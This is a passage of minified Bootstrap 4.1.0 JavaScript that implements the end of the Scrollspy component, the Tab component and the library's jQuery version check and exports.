Math.max(document.body.scrollHeight, document.documentElement.scrollHeight) }, t._getOffsetHeight = function () { return this._scrollElement === window ? window.innerHeight : this._scrollElement.getBoundingClientRect().height }, t._process = function () { var t = this._getScrollTop() + this._config.offset, e = this._getScrollHeight(), n = this._config.offset + e - this._getOffsetHeight(); if (this._scrollHeight !== e && this.refresh(), n <= t) { var i = this._targets[this._targets.length - 1]; this._activeTarget !== i && this._activate(i) } else { if (this._activeTarget && t < this._offsets[0] && 0 < this._offsets[0]) return this._activeTarget = null, void this._clear(); for (var r = this._offsets.length; r--;) { this._activeTarget !== this._targets[r] && t >= this._offsets[r] && ("undefined" == typeof this._offsets[r + 1] || t < this._offsets[r + 1]) && this._activate(this._targets[r]) } } }, t._activate = function (e) { this._activeTarget = e, this._clear(); var t = this._selector.split(","); t = t.map(function (t) { return t + '[data-target="' + e + '"],' + t + '[href="' + e + '"]' }); var n = Kn(t.join(",")); n.hasClass(Jn) ? (n.closest($n.DROPDOWN).find($n.DROPDOWN_TOGGLE).addClass(Zn), n.addClass(Zn)) : (n.addClass(Zn), n.parents($n.NAV_LIST_GROUP).prev($n.NAV_LINKS + ", " + $n.LIST_ITEMS).addClass(Zn), n.parents($n.NAV_LIST_GROUP).prev($n.NAV_ITEMS).children($n.NAV_LINKS).addClass(Zn)), Kn(this._scrollElement).trigger(Xn.ACTIVATE, { relatedTarget: e }) }, t._clear = function () { Kn(this._selector).filter($n.ACTIVE).removeClass(Zn) }, n._jQueryInterface = function (e) { return this.each(function () { var t = Kn(this).data(Qn); if (t || (t = new n(this, "object" == typeof e && e), Kn(this).data(Qn, t)), "string" == typeof e) { if ("undefined" == typeof t[e]) throw new TypeError('No method named "' + e + '"'); t[e]() } }) }, s(n, null, [{ key: "VERSION", get: function () { return "4.1.0" } }, { key: "Default", get: function () { return qn } }]), n }(), Kn(window).on(Xn.LOAD_DATA_API, function () { for (var t = Kn.makeArray(Kn($n.DATA_SPY)), e = t.length; e--;) { var n = Kn(t[e]); ni._jQueryInterface.call(n, n.data()) } }), Kn.fn[Vn] = ni._jQueryInterface, Kn.fn[Vn].Constructor = ni, Kn.fn[Vn].noConflict = function () { return Kn.fn[Vn] = Gn, ni._jQueryInterface }, ni), Di = (oi = "." + (ri = "bs.tab"), si = (ii = e).fn.tab, ai = { HIDE: "hide" + oi, HIDDEN: "hidden" + oi, SHOW: "show" + oi, SHOWN: "shown" + oi, CLICK_DATA_API: "click" + oi + ".data-api" }, li = "dropdown-menu", ci = "active", fi = "disabled", hi = "fade", ui = "show", di = ".dropdown", pi = ".nav, .list-group", gi = ".active", mi = "> li > .active", _i = '[data-toggle="tab"], [data-toggle="pill"], [data-toggle="list"]', vi = ".dropdown-toggle", Ei = "> .dropdown-menu .active", yi = function () { function i(t) { this._element = t } var t = i.prototype; return t.show = function () { var n = this; if (!(this._element.parentNode && this._element.parentNode.nodeType === Node.ELEMENT_NODE && ii(this._element).hasClass(ci) || ii(this._element).hasClass(fi))) { var t, i, e = ii(this._element).closest(pi)[0], r = gt.getSelectorFromElement(this._element); if (e) { var o = "UL" === e.nodeName ? mi : gi; i = (i = ii.makeArray(ii(e).find(o)))[i.length - 1] } var s = ii.Event(ai.HIDE, { relatedTarget: this._element }), a = ii.Event(ai.SHOW, { relatedTarget: i }); if (i && ii(i).trigger(s), ii(this._element).trigger(a), !a.isDefaultPrevented() && !s.isDefaultPrevented()) { r && (t = ii(r)[0]), this._activate(this._element, e); var l = function () { var t = ii.Event(ai.HIDDEN, { relatedTarget: n._element }), e = ii.Event(ai.SHOWN, { relatedTarget: i }); ii(i).trigger(t), ii(n._element).trigger(e) }; t ? this._activate(t, t.parentNode, l) : l() } } }, t.dispose = function () { ii.removeData(this._element, ri), this._element = null }, t._activate = function (t, e, n) { var i = this, r = ("UL" === e.nodeName ? ii(e).find(mi) : ii(e).children(gi))[0], o = n && r && ii(r).hasClass(hi), s = function () { return i._transitionComplete(t, r, n) }; if (r && o) { var a = gt.getTransitionDurationFromElement(r); ii(r).one(gt.TRANSITION_END, s).emulateTransitionEnd(a) } else s() }, t._transitionComplete = function (t, e, n) { if (e) { ii(e).removeClass(ui + " " + ci); var i = ii(e.parentNode).find(Ei)[0]; i && ii(i).removeClass(ci), "tab" === e.getAttribute("role") && e.setAttribute("aria-selected", !1) } if (ii(t).addClass(ci), "tab" === t.getAttribute("role") && t.setAttribute("aria-selected", !0), gt.reflow(t), ii(t).addClass(ui), t.parentNode && ii(t.parentNode).hasClass(li)) { var r = ii(t).closest(di)[0]; r && ii(r).find(vi).addClass(ci), t.setAttribute("aria-expanded", !0) } n && n() }, i._jQueryInterface = function (n) { return this.each(function () { var t = ii(this), e = t.data(ri); if (e || (e = new i(this), t.data(ri, e)), "string" == typeof n) { if ("undefined" == typeof e[n]) throw new TypeError('No method named "' + n + '"'); e[n]() } }) }, s(i, null, [{ key: "VERSION", get: function () { return "4.1.0" } }]), i }(), ii(document).on(ai.CLICK_DATA_API, _i, function (t) { t.preventDefault(), yi._jQueryInterface.call(ii(this), "show") }), ii.fn.tab = yi._jQueryInterface, ii.fn.tab.Constructor = yi, ii.fn.tab.noConflict = function () { return ii.fn.tab = si, yi._jQueryInterface }, yi); !function (t) { if ("undefined" == typeof t) throw new TypeError("Bootstrap's JavaScript requires jQuery. jQuery must be included before Bootstrap's JavaScript."); var e = t.fn.jquery.split(" ")[0].split("."); if (e[0] < 2 && e[1] < 9 || 1 === e[0] && 9 === e[1] && e[2] < 1 || 4 <= e[0]) throw new Error("Bootstrap's JavaScript requires at least jQuery v1.9.1 but less than v4.0.0") }(e), t.Util = gt, t.Alert = mt, t.Button = _t, t.Carousel = vt, t.Collapse = Et, t.Dropdown = bi, t.Modal = Ti, t.Popover = wi, t.Scrollspy = Ii, t.Tab = Di, t.Tooltip = Ci, Object.defineProperty(t, "__esModule", { value: !0 }) });
//# sourceMappingURL=bootstrap.bundle.min.js.map








